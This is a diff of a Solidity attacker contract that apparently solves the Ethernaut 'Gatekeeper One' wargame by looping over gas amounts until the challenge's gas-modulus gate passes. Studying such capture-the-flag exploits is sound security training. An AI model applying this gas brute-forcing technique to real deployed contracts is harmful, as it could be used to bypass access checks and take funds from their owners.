@@ -11,12 +11,29 @@ contract GatekeeperOneAttacker {
     using SafeMath for uint256;
     IGatekeeperOne public challenge;
 
+    event AttackSuccess(uint256 gasOffset);
+
     constructor(address challengeAddress) {
         challenge = IGatekeeperOne(challengeAddress);
     }
 
-    function attack(bytes8 gateKey, uint256 gasToUse) external payable {
-        challenge.enter{gas: gasToUse}(gateKey);
+    function attack(bytes8 gateKey) external {
+        bytes memory payload = abi.encodeWithSignature(
+            "enter(bytes8)",
+            gateKey
+        );
+
+        // 8191 is the modulus used in gateTwo.
+        // We multiply it by a factor to ensure there is enough gas
+        // to reach the gate check, then fine-tune the remainder with +i.
+        for (uint256 i = 0; i < 800; i++) {
+            (bool ok, ) = address(challenge).call{gas: 8191 * 7 + i}(payload);
+            if (ok) {
+                emit AttackSuccess(i);
+                return;
+            }
+        }
+        revert("gateTwo not passed");
     }
 
     modifier gateOne() {
@@ -46,7 +63,9 @@ contract GatekeeperOneAttacker {
         _;
     }
 
-    function testenter(bytes8 _gateKey)
+    function testenter(
+        bytes8 _gateKey
+    )
         public
         // gateOne
         // gateTwo
